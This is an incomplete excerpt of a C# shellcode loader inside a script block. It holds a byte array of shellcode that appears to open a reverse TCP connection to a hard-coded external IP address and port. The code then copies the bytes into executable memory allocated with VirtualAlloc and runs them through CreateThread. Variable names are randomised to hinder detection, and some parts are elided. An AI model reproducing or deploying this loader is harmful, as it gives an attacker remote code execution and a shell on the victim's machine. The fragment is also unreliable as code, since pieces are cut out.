...
0x68,0x03,0x13,0x03,0x96,0x68,0x02,0x00,0x39,0x1d,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr f4R2YIG87 = VirtualAlloc(IntPtr.Zero,(UIntPtr)lERFBfjJRqw.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(lERFBfjJRqw,0,f4R2YIG87,lERFBfjJRqw.Length);
        IntPtr a5TKs6h = IntPtr.Zero;
        IntPtr jwVQ = CreateThread(IntPtr.Zero,UIntPtr.Zero,f4R2YIG87,IntPtr.Zero,0,ref a5TKs6h);
    }
</script>